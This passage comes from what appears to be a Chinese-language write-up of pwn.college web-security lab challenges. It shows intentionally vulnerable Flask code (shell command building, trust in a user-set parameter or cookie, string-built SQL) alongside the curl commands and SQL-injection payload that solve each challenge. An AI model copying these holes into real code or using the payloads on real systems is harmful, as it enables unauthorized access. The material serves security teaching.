class="line">        .replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;`&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">    command = <span class="string">f&quot;ls -l <span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l <span class="subst">&#123;directory&#125;</span>&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-8-Authentication-Bypass-1"><a href="#3-8-Authentication-Bypass-1" class="headerlink" title="3.8 Authentication Bypass 1"></a>3.8 Authentication Bypass 1</h3><p>这里源码就已经给出解决的办法了，我们只需要传入<code>session_user=admin</code>就可以直接获取flag了，反正它又不检查密码：</p><p><code>curl &quot;http://challenge.localhost:80/?session_user=admin&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.args.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t panic about this class. It simply implements a temporary database in which</span></span><br><span class="line"><span class="comment"># this application can store data. You don&#x27;t need to understand its internals, just</span></span><br><span class="line"><span class="comment"># that it processes SQL queries using db.execute().</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [os.urandom(<span class="number">8</span>)])</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">f&quot;&quot;&quot;<span class="subst">&#123;flask.request.path&#125;</span>?session_user=<span class="subst">&#123;username&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.args.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-9-Authentication-Bypass-2"><a href="#3-9-Authentication-Bypass-2" class="headerlink" title="3.9 Authentication Bypass 2"></a>3.9 Authentication Bypass 2</h3><p>发送带有伪造的 Cookie 的请求，就可以解决问题了<code>curl --cookie &quot;session_user=admin&quot; http://challenge.localhost:80/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [os.urandom(<span class="number">8</span>)])</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    response = flask.redirect(flask.request.path)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;session_user&#x27;</span>, username)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.cookies.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-9-SQLi-1"><a href="#3-9-SQLi-1" class="headerlink" title="3.9 SQLi 1"></a>3.9 SQLi 1</h3><p>观察代码后我们发现需要注入的地方是向服务器发送POST请求的SQL注入<code>query = f&#39;SELECT rowid, * FROM users WHERE username = &quot;&#123;username&#125;&quot; AND pin = &#123;pin&#125;&#39;</code></p><p>因此我们可以构造<code>SELECT * FROM users WHERE username = &#39;admin&#39; AND pin = &#39;&#39; 1 OR 1=1 --&#39;&#39;</code></p><p>这是因为SQL的运算优先级时准讯标准的逻辑运算优先级的，AND的优先级高于OR</p><p><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND pin = 1 OR 1=1</code> 实际执行的顺序是</p><p><code>SELECT * FROM users WHERE (username = &#39;admin&#39; AND pin = 1) OR (1=1)</code>，返回的结果始终为真。</p><p>所以我们执行<code>curl -c cookies.txt -X POST http://challenge.localhost -d &quot;username=admin&amp;pin=1%20OR%201=1%20%20--&quot;</code>登陆请求并保存<code>cookies.txt</code></p><p>然后使用保存的 Cookie 发出 GET 请求获取flag <code>curl -b cookies.txt http://challenge.localhost</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 执行 SQL 查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 以字典形式返回行</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># 创建一个包含 admin 用户的表，PIN 为随机生成的值</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as pin&quot;&quot;&quot;</span>, [random.randrange(<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">63</span>)])</span><br><span class="line"><span class="comment"># 插入一个 guest 用户，PIN 为 1337</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, 1337 as pin&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 处理 POST 请求以进行登录</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    pin = flask.request.form.get(<span class="string">&quot;pin&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查请求参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pin:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `pin` form parameter&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查 PIN 是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> pin[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造 SQL 查询以验证用户</span></span><br><span class="line">        query = <span class="string">f&#x27;SELECT rowid, * FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot; AND pin = <span class="subst">&#123;pin&#125;</span>&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)</span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果用户不存在，返回403</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登录成功，存储用户信息到会话中</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 处理 GET 请求以显示登录页面或欢迎信息</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="comment"># 如果用户是 admin，显示旗帜内容</span></span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;PIN:&lt;input type=text name=pin&gt;&lt;input type=submit 